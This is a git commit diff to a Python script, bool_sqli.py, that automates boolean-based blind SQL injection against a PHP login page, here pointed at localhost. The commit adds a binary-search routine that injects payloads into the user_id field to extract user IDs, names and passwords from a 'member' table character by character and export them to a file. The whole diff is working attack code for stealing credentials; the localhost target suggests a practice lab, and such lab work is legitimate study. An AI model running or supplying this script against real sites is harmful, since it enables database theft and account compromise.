5e0d7a9b2a9e6b350f8c2671cb23f5f935f6e6f7
MrMirror21 <49388937+MrMirror21@users.noreply.github.com>
2024-05-27 18:20:24 +0900

    binary search 적용한 sqli 추가

--- bool_sqli.py
+++ bool_sqli.py
@@ -2,7 +2,7 @@ import requests	# post(),status_code 사용하기 위해
 import pandas as pd
 
 # SQL Injection을 사용할 url 입력
-url = "http://localhost/login_ok.php"
+url = "http://localhost/login_ok.php"	
 # Request에서 전달되는 파라미터를 딕셔너리형 변수로 저장
 requestData = {'user_id': 'admin', 'user_pw' : '', 'Submit' : 'Login'}
 # 사이트에 가입 후 가입한 아이디를 입력 받을 변수
@@ -36,11 +36,11 @@ def testSql():
         print("There's weak point in this page.")
 
 def getCount(input):
-    count = 48
+    count = 0
     while(True):
         count += 1
         data = {'user_id': 'admin', 'user_pw' : '', 'Submit' : 'Login'}
-        query = f"' or 1=1 and ascii(substr(({input}), 1, 1)) = {count} #"
+        query = f"' or 1=1 and ({input}) = {count} #"
         data['user_id'] = query
         req = requests.post(url, data=data)
         if req.status_code == 200:
@@ -49,7 +49,7 @@ def getCount(input):
             else:
                 continue
     print("Count : " + chr(count))
-    return int(chr(count))
+    return int(count)
 
 def isNotEnd(index,query):
     data = {'user_id': 'admin', 'user_pw' : '', 'Submit' : 'Login'}
@@ -184,11 +184,48 @@ def SQLi_get_User_Data(columnName):
     print(f"{count}th working")
     return memberDataRow
 
+def SQLi_get_User_Data_Binary(columnName):
+    memberDataRow = []
+    guessed_name = ""
+    count = 1
+    print("Trying to get user data...")
+    print(getCount(checkDataCount))
+    for i in range(getCount(checkDataCount)) :
+        memberIndex = i
+        charIndex = 1
+        checkValue = f"select {columnName} from member limit {memberIndex},1"
+        while(isNotEnd(charIndex, checkValue)):
+            asciiStart = 32
+            asciiEnd = 122
+            checkValue = f"select {columnName} from member limit {memberIndex},1"
+            while (asciiStart <= asciiEnd):
+                count += 1
+                mid = (asciiEnd + asciiStart) // 2
+                requestData["user_id"] = f"' or 1=1 and ascii(substr(({checkValue}),{charIndex},1)) = {mid} #"
+                req = requests.post(url, data=requestData)
+                if req.status_code == 200:
+                    if "Wrong ID or PW." not in req.text:
+                        guessed_name += chr(mid)
+                        charIndex += 1
+                        asciiStart = 32
+                    else:
+                        requestData["user_id"] = f"' or 1=1 and ascii(substr(({checkValue}), {charIndex}, 1)) > {mid} #"
+                        req2 = requests.post(url, data=requestData)
+                        if "Wrong ID or PW." not in req2.text:
+                            asciiStart = mid + 1
+                        else:
+                            asciiEnd = mid - 1
+        print(str(i + 1) +f"th {columnName}: " + guessed_name + '\n')
+        memberDataRow.append(guessed_name)
+        guessed_name = ""
+    print(f"{count}th working")
+    return memberDataRow
+
 def SQLi_Extract_To_File():
     data = {}
-    data['user_id'] = SQLi_get_User_Data('user_id')
-    data['user_name'] = SQLi_get_User_Data('user_name')
-    data['user_pw'] = SQLi_get_User_Data('user_pw')
+    data['user_id'] = SQLi_get_User_Data_Binary('user_id')
+    data['user_name'] = SQLi_get_User_Data_Binary('user_name')
+    data['user_pw'] = SQLi_get_User_Data_Binary('user_pw')
 
     df = pd.DataFrame(data)
 
@@ -208,8 +245,8 @@ def main():
     #print("\nStart getting name of table in user")
     #SQLi_get_Table_Name()
 
-    print("\nStart getting name of column in member")
-    SQLi_get_Column_Name()
+    #print("\nStart getting name of column in member")
+    #SQLi_get_Column_Name()
 
     print("\nGetting information from member.. ")
     SQLi_Extract_To_File()
